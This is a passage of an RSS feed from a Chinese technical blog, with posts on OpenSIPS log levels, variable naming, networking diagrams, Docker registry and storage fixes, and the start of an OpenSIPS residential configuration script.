&lt;p&gt;日志级别如果设置为2， 那么只会打印小于等于2的日志。默认使用xlog(&amp;ldquo;hello&amp;rdquo;), 那么日志级别就会是L_ERR&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;生产环境建议将日志界别调整到-1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.x的opensips使用 debug=3 设置日志级别&lt;!-- raw HTML omitted --&gt;2.x的opensips使用 log_level=3 设置日志级别&lt;/p&gt;
&lt;h1 id=&#34;动态设置日志级别&#34;&gt;动态设置日志级别&lt;/h1&gt;
&lt;p&gt;在程序运行时，可以通过opensipctl 命令动态设置日志级别&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl fifo log_level &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;最好使用日志级别&#34;&gt;最好使用日志级别&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;不要为了简便，都用 xlog(&amp;#34;msg&amp;#34;)

如果msg是信息级别，用xlog(&amp;#34;L_INFO&amp;#34;, &amp;#34;msg&amp;#34;)
如果msg是错误信息，则使用xlog(&amp;#34;msg&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>编码规则</title>
      <link>https://wdd.js.org/posts/2019/07/pxdvcx/</link>
      <pubDate>Tue, 09 Jul 2019 09:49:33 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/pxdvcx/</guid>
      <description>&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;变量不要使用缩写，要见名知意&lt;/strong&gt;。现代化的IDE都提供自动补全功能，即使是VIM, 也可以用ctrl+n， ctrl+p, ctrl+y, ctrl+e去自动补全。 &lt;strong&gt;变量名缩写真是灾难。&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>图解通信网络 第二版</title>
      <link>https://wdd.js.org/network/graph-network/</link>
      <pubDate>Mon, 08 Jul 2019 21:32:50 +0800</pubDate>
      <guid>https://wdd.js.org/network/graph-network/</guid>
      <description>&lt;p&gt;图片来自 &lt;a href=&#34;https://microchipdeveloper.com/&#34;&gt;https://microchipdeveloper.com/&lt;/a&gt; 只不过这个网站访问速度很慢，但是里面的图片非常有意思，能够简洁明了的说明一个概念。&lt;/p&gt;
&lt;p&gt;上学的时候，数学老师喜欢在讲课前先讲一些概念，然后再做题。但是我觉得概念并没有那么重要，我更喜欢做题。&lt;/p&gt;
&lt;p&gt;但是，当你理解了概念后，再去实战，就有事半功倍的效果。&lt;/p&gt;
&lt;h1 id=&#34;1-路由器&#34;&gt;1. 路由器&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;路由器（英语：Router，又称路径器）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过的路由路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议（IP）。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;路由器用来做网络之间的链接，所以路由器一般至少会链接到两个网络上。常见的就是一边连接外网，一边连接内网。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-07-37.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-ip地址&#34;&gt;2. IP地址&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-08-01.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-交换机&#34;&gt;3. 交换机&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-08-16.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-五层网络模型&#34;&gt;4. 五层网络模型&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-09-08.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-09-19.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-09-29.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-09-38.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-tcp-vs-udp&#34;&gt;5. TCP vs UDP&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-09-56.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;6-tcp-和-udp-头&#34;&gt;6. TCP 和 UDP 头&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-10-04.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;7-常见的端口号&#34;&gt;7. 常见的端口号&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-10-13.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;8-客户端和服务端&#34;&gt;8. 客户端和服务端&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-10-26.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;9-socket&#34;&gt;9. Socket&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-10-40.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;10-socket建立&#34;&gt;10. Socket建立&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-10-49.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;11-一个web服务器的工作过程s&#34;&gt;11. 一个Web服务器的工作过程s&lt;/h1&gt;
&lt;h2 id=&#34;step1-服务器在80端口监听消息&#34;&gt;step1: 服务器在80端口监听消息&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-11-04.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;step2-客户端随机选择一个端口向服务端发起连接请求&#34;&gt;step2: 客户端随机选择一个端口，向服务端发起连接请求&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-11-22.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;step3-传输层将消息传输给服务器&#34;&gt;step3: 传输层将消息传输给服务器&lt;/h2&gt;
&lt;p&gt;服务端建立一个Socket用来和客户端建立通道&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-11-33.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;step4-服务器通过socket将html发给客户端&#34;&gt;step4: 服务器通过socket将html发给客户端&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-11-41.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;step5-消息接受完毕socket关闭&#34;&gt;step5: 消息接受完毕，Socket关闭&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-11-48.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;12-nat&#34;&gt;12 NAT&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/network/graph-network/2022-10-29-18-11-55.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8&#34;&gt;https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Docker相关问题及解决方案</title>
      <link>https://wdd.js.org/posts/2019/07/fpbkzg/</link>
      <pubDate>Mon, 08 Jul 2019 11:59:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/07/fpbkzg/</guid>
      <description>&lt;h1 id=&#34;使用http仓库&#34;&gt;使用HTTP仓库&lt;/h1&gt;
&lt;p&gt;默认docker不允许使用HTTP的仓库，只允许HTTPS的仓库。如果你用http的仓库，可能会报如下的错误。&lt;/p&gt;
&lt;p&gt;Get https://registry:5000/v1/_ping: http: server gave HTTP response to HTTPS client&lt;/p&gt;
&lt;p&gt;解决方案是：配置insecure-registries使docker使用我们的http仓库。&lt;/p&gt;
&lt;p&gt;在 &lt;strong&gt;/etc/docker/daemon.json 文件中添加&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;insecure-registries&amp;#34;&lt;/span&gt; : &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registry:5000&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;harbor:5000&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启docker&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service docker restart
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 执行命令 docker info | grep insecure 应该可以看到不安全仓库&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;存储问题&#34;&gt;存储问题&lt;/h1&gt;
&lt;p&gt;有些docker的存储策略并未指定，在运行容器时，可能会报如下错误&lt;/p&gt;
&lt;p&gt;/usr/bin/docker-current: Error response from daemon: error creating overlay mount to&lt;/p&gt;
&lt;p&gt;解决方案：&lt;/p&gt;
&lt;p&gt;vim /etc/sysconfig/docker-storage&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DOCKER_STORAGE_OPTIONS&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-s overlay&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl daemon-reload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service docker restart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;!-- raw HTML omitted --&gt;</description>
    </item>
    <item>
      <title>opensips-summit-fraud</title>
      <link>https://wdd.js.org/opensips/ch8/fraud/</link>
      <pubDate>Tue, 02 Jul 2019 22:35:03 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/fraud/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $Id$&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# OpenSIPS residential configuration script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#     by OpenSIPS Solutions &amp;lt;team@opensips-solutions.com&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This script was generated via &amp;#34;make menuconfig&amp;#34;, from&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   the &amp;#34;Residential&amp;#34; scenario.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# You can enable / disable more features / functionalities by&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   re-generating the scenario with different options.#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Please refer to the Core CookBook at:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#      http://www.opensips.org/Resources/DocsCookbooks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for a explanation of possible statements, functions and parameters.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Global Parameters #########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;memdump&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;-1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the following line to enable debugging */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable the auto temporary blacklisting of 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   not available destinations &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#disable_dns_blacklist=no&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable IPv6 lookup after IPv4 dns 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lookup failures &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#dns_try_ipv6=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* comment the next line to enable the auto discovery of local aliases
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   based on revers DNS on IPs */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auto_aliases&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:127.0.0.1:5060   &lt;span style=&#34;color:#75715e&#34;&gt;# CUSTOMIZE ME&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:10.0.2.8:5060   &lt;span style=&#34;color:#75715e&#34;&gt;# CUSTOMIZE ME&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Modules Section ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_udp.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIGNALING module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### StateLess module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Transaction Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_timeout&amp;#34;&lt;/span&gt;, 5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_inv_timeout&amp;#34;&lt;/span&gt;, 30&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;restart_fr_on_each_reply&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreply_avp_mode&amp;#34;&lt;/span&gt;, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Record Route Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not append from tag to the RR &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no need &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this script&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### MAX ForWarD module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIP MSG OPerationS module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipmsgops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
